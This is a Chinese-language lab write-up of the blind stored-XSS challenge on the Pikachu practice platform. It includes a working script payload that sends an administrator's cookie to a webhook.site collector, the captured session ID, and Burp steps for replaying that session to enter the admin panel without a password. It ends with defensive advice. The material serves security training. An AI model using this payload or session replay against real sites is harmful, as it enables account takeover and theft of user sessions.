【Pikachu】Web-XSS-XSS之盲打 Writeup

操作者：何芊宏 | 操作日期：2026.9.27 | 分类：Pikachu | 标签：Pikachu, Web, XSS, 盲打XSS, 会话劫持

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - Cross-Site Scripting (XSS)
  • 题目名称：XSS之盲打
  • 环境：Burp Suite 社区版自带浏览器 + Webhook.site 接收平台。
  • 目标：向留言板提交恶意 Payload，模拟管理员访问后台触发，通过 Webhook 窃取管理员 Cookie，并利用窃取的 Cookie 实现免密登录后台。

2. 解题思路与知识点

漏洞原理：

盲打型 XSS 本质上属于存储型 XSS。区别在于：它的触发点在管理员后台，普通用户提交后无法直接看到回显，必须借助外带平台（如 webhook.site）或手动访问后台验证。

盲打 XSS 如何演变为“会话劫持”？
  • 埋雷：前台提交构造好的恶意 JS 代码（包含 Webhook 外带逻辑）。
  • 触发：管理员登录后台查看反馈，浏览器自动执行恶意代码。
  • 窃取：恶意代码利用 <img> 标签跨域请求，将管理员的 PHPSESSID 发送到 Webhook。
  • 劫持：攻击者拿到 Session ID 后，伪造请求头中的 Cookie，直接以管理员身份访问后台，无需密码。

3. 操作步骤

第一步：准备外带接收平台

打开 webhook.site，获取专属的唯一 URL（例如：https://webhook.site/44f4f857-1f6f...），保持页面开启。

第二步：提交盲打 Payload

Payload： <script>var img=new Image();img.src="https://webhook.site/44f4f857...?cookie="+document.cookie;</script>

在“看法”和“大名”输入框中均填入该 Payload，点击提交。页面提示“谢谢参与”。

第三步：触发与验证（获取 Cookie）

触发：访问后台登录地址 admin_login.php，使用 admin/123456 登录，进入后台管理页 admin.php。

现象一（弹窗证明）：页面加载时立刻弹出对话框 1，证明恶意代码在管理员浏览器中执行。

现象二（外带证明）：切回 Webhook 页面，发现收到一条 GET 请求，Query Strings 成功获取到管理员的 Cookie：ant[uname]=admin; ant[pw]=...; PHPSESSID=dhmjmeood177m4s2vut5u6lsei。

第四步：进阶利用——免密劫持后台（核心战果）

为了证明漏洞的实质危害，我在 Burp 中进行了会话劫持验证：

  • 拦截一个对 admin_login.php 的请求。
  • 将请求方法修改为 GET，目标 URL 改为 admin.php。
  • 删除请求头中的 Content-Length 和 Content-Type。
  • 删除底部的请求体（username=...）。
  • 核心操作：将 Cookie: PHPSESSID=... 替换为 Webhook 窃取到的 PHPSESSID=dhmjmeood177m4s2vut5u6lsei。
  • 放行请求，服务器返回状态码 200，页面直接渲染出“用户反馈的意见列表”，无需输入任何密码即成功进入后台。

4. 踩坑记录与复盘

  • 坑1：提交后才打开 Webhook。盲打 XSS 是持久化的，触发时机在于“管理员访问后台”，而不是“提交留言”。只要数据存入了数据库，任何时候去后台触发都不晚。
  • 坑2：手工改包残留 Content-Length。将 POST 改为 GET 并清空请求体后，如果保留了 Content-Length 头，服务器会因等待数据而超时或报错。必须连同请求头一起删除，请求才能顺利发送。

5. 知识总结

  • 盲打 XSS 的真实杀伤力：不再局限于前端弹窗，而是直击管理员权限。通过窃取 Session，攻击者可以完全接管后台，实施数据篡改、删除或进一步渗透。
  • 防御建议：服务端对用户输入进行严格的过滤和转义；后台管理系统避免直接渲染用户提交的 HTML 内容；设置 Cookie 的 HttpOnly 属性（这一条最关键，能直接防止 JavaScript 读取 Cookie）。
